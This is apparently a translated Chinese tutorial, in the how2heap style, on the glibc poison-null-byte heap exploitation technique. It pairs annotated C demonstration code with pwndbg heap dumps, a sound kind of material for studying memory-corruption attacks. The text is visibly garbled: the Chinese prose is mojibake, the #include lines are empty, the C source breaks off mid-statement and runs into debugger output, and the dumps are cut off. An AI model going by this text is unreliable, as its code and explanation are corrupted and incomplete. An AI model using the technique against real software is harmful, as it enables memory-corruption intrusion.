# how2heapä¹‹poison_null_bytes&&house of einherjar
|
##### è¯‘æ–‡å£°æ˜
æœ¬æ–‡æ˜¯ç¿»è¯‘æ–‡ç« 
è¯‘æ–‡ä»…ä¾›å‚è€ƒï¼Œå…·ä½“å†…å®¹è¡¨è¾¾ä»¥åŠå«ä¹‰åŸæ–‡ä¸ºå‡†ã€‚
> æ¬¢è¿å„ä½å–œæ¬¢å®‰å…¨çš„å°ä¼™ä¼´ä»¬åŠ å…¥æ˜Ÿç›Ÿå®‰å…¨ UVEgZ3JvdXA6IDU3MDI5NTQ2MQ==
>
> æœ¬æ–‡åŒ…æ‹¬poison null byteså’Œhouse of einherjar
PS:ç”±äºæœ¬äººæ‰ç–å­¦æµ…,æ–‡ä¸­å¯èƒ½ä¼šæœ‰ä¸€äº›ç†è§£çš„ä¸å¯¹çš„åœ°æ–¹,æ¬¢è¿å„ä½æ–§æ­£ ğŸ™‚
## å‚è€ƒç½‘ç«™
    https://ctf-wiki.github.io/ctf-wiki
    https://www.slideshare.net/codeblue_jp/cb16-matsukuma-en-68459606
## poison null bytes
###  åº
ä½œè€…çš„è¯:æœ¬ä¾‹æ¨èåœ¨ubuntu14.04ä¸Šè¿›è¡Œæµ‹è¯•,å¹¶ä¸”åªé€‚ç”¨äºæ²¡æœ‰tcacheçš„glibc
è¿™ä¸ªpoison null byteåˆ©ç”¨æ€è·¯ä¾æ—§æ˜¯åˆ¶é€ ä¸€ä¸ªoverlapping
chunk,è™½ç„¶ä½œè€…è¯´è¦åœ¨ubuntu14.04ä¸Šæµ‹è¯•,ä½†å…¶å®ubuntu16.04ä¹Ÿæ˜¯å¯ä»¥çš„,åªè¦æ²¡æœ‰tcache,è¿™ç§æ”»å‡»æ–¹å¼å°±æ˜¯å¯ä»¥ä½¿ç”¨çš„:)
###  æºä»£ç 
è¿™é‡Œæˆ‘ä¹Ÿåˆ äº†ä¸€éƒ¨åˆ†ä½œè€…çš„è¯,åŠ äº†äº›æ³¨é‡Š
    #include                                                                                                                               
    #include                                                                                                                                       
    #include                                                                                                                                       
    #include                                                                                                                                       
    #include                                                                                                                                       
    int main()                                                                                                                                               
    {                                                                                                                                                                                  
            uint8_t* a;                                                                                                                                      
            uint8_t* b;                                                                                                                                      
            uint8_t* c;                                                                                                                                      
            uint8_t* b1;                                                                                                                                     
            uint8_t* b2;                                                                                                                                     
            uint8_t* d;                                                                                                                                      
            void *barrier;                                                                                                                                   
            fprintf(stderr, "We allocate 0x100 bytes for 'a'.n");                                                                                           
            a = (uint8_t*) malloc(0x100);                                                                                                                    
            fprintf(stderr, "a: %pn", a);                                                                                                                   
            int real_a_size = malloc_usable_size(a);             
            //æˆ‘ä»¬æƒ³æº¢å‡º'a'çš„è¯,æˆ‘ä»¬éœ€è¦çŸ¥é“'a'çš„çœŸå®å¤§å°
            fprintf(stderr, "Since we want to overflow 'a', we need to know the 'real' size of 'a' "                                                         
                    "(it may be more than 0x100 because of rounding): %#xn", real_a_size);                                                                  
            //chunk sizeå±æ€§çš„æœ€å°çš„æœ‰æ•ˆå­—èŠ‚ä¸èƒ½æ˜¯0x00,æœ€å°çš„ä¹Ÿå¿…é¡»æ˜¯0x10,å› ä¸ºchunkçš„sizeåŒ…æ‹¬è¯·æ±‚çš„é‡åŠ ä¸Šå…ƒæ•°æ®æ‰€éœ€çš„å¤§å°(ä¹Ÿå°±æ˜¯æˆ‘ä»¬çš„sizeå’Œpre_sizeç„¶åç©ºé—´å¤ç”¨
            /* chunk size attribute cannot have a least significant byte with a value of 0x00.                                                               
             * the least significant byte of this will be 0x10, because the size of the chunk includes                                                       
             * the amount requested plus some amount required for the metadata. */                                                                           
            b = (uint8_t*) malloc(0x200);                                                                                                                    
            fprintf(stderr, "b: %pn", b);                                                                                                                   
            c = (uint8_t*) malloc(0x100);                                                                                                                    
            fprintf(stderr, "c: %pn", c);                                                                                                                   
            barrier =  malloc(0x100);              
            //cæˆ‘ä»¬åˆ†é…äº†barrier,è¿™æ ·æˆ‘ä»¬free cçš„æ—¶å€™å°±ä¸ä¼šè¢«åˆå¹¶åˆ°top chunké‡Œäº†,è¿™ä¸ªburrierå¹¶ä¸æ˜¯å¿…é¡»çš„,åªä¸è¿‡æ˜¯ä¸ºäº†å‡å°‘å¯èƒ½äº§ç”Ÿçš„é—®é¢˜                                                                                                     
            fprintf(stderr, "We allocate a barrier at %p, so that c is not consolidated with the top-chunk when freed.n"                                    
                    "The barrier is not strictly necessary, but makes things less confusingn", barrier);                                                    
            uint64_t* b_size_ptr = (uint64_t*)(b - 8);                                                                                                       
            //åœ¨æ–°ç‰ˆæœ¬çš„glibcä¸­æ·»åŠ äº†æ–°çš„checkå³: size==prev_next(next_chunk)
            // added fix for size==prev_size(next_chunk) check in newer versions of glibc                                                                    
            // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30        
            //è¿™ä¸ªè¢«æ–°å¢çš„checkè¦æ±‚æˆ‘ä»¬å…è®¸bä¸­æœ‰nullæŒ‡é’ˆè€Œä¸ä»…ä»…æ˜¯c                                       
            // this added check requires we are allowed to have null pointers in b (not just a c string)                                                     
            //*(size_t*)(b+0x1f0) = 0x200;   
            //åœ¨æ–°ç‰ˆæœ¬çš„glibcä¸­æˆ‘ä»¬éœ€è¦è®©æˆ‘ä»¬æ›´æ–°çš„sizeåŒ…å«bè‡ªèº«å»pass 'chunksize(P)!=prev_size(next_chunk(P))'                                                                                                                
            fprintf(stderr, "In newer versions of glibc we will need to have our updated size inside b itself to pass "                                      
                    "the check 'chunksize(P) != prev_size (next_chunk(P))'n");           
            //æˆ‘ä»¬å°†æ­¤ä½ç½®è®¾ä¸º0x200,å› ä¸º0x200==(0x211&0xff00)
            // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)   
            //è¿™ä¸ªæ˜¯b.sizeçš„å€¼åœ¨è¢«nullå­—èŠ‚è¦†ç›–ä¹‹åçš„å€¼                                                                              
            // which is the value of b.size after its first byte has been overwritten with a NULL byte                                                       
            *(size_t*)(b+0x1f0) = 0x200;                                                                                                                     
            //è¿™ä¸ªæŠ€æœ¯é€šè¿‡è¦†ç›–ä¸€ä¸ªfree chunkçš„å…ƒæ•°æ®æ¥ç”Ÿæ•ˆ
            // this technique works by overwriting the size metadata of a free chunk                                                                         
            free(b);                                                                                                                                         
            fprintf(stderr, "b.size: %#lxn", *b_size_ptr);                                                                                                  
            fprintf(stderr, "b.size is: (0x200 + 0x10) | prev_in_usen"); 
            //æˆ‘ä»¬é€šè¿‡ç”¨ä¸€ä¸ªnullå­—èŠ‚æ¥æº¢å‡ºaæ¥ä¿®æ”¹bçš„å…ƒæ•°æ®                                                                                   
            fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'n");                                                           
            a[real_a_size] = 0; //  heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 529,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603320 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
ç„¶åç¨‹åºä¿®æ”¹äº†b+0x1f0ä½ä¸º0x200,ä¹Ÿå°±æ˜¯
    pwndbg> p/x 0x603120+0x1f0
    $4 = 0x603310
    pwndbg> x/10gx 0x603310
    0x603310:       0x0000000000000200      0x0000000000000000
    0x603320:       0x0000000000000000      0x0000000000000111
    0x603330:       0x0000000000000000      0x0000000000000000
    0x603340:       0x0000000000000000      0x0000000000000000
    0x603350:       0x0000000000000000      0x0000000000000000
å¥½äº†,ä¸‹é¢æˆ‘ä»¬ç»§ç»­,æ­¤æ—¶ç¨‹åºå·²ç»é‡Šæ”¾äº†b
    pwndbg> heap
    0x603000 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603110 PREV_INUSE {
      prev_size = 0,
      size = 529,
      fd = 0x7ffff7dd1b78 ,
      bk = 0x7ffff7dd1b78 ,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603320 {
      prev_size = 528,
      size = 272,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603430 PREV_INUSE {
      prev_size = 0,
      size = 273,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    0x603540 PREV_INUSE {
      prev_size = 0,
      size = 133825,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    pwndbg> bins
    fastbins
    0x20: 0x0
    0x30: 0x0
    0x40: 0x0
    0x50: 0x0
    0x60: 0x0
    0x70: 0x0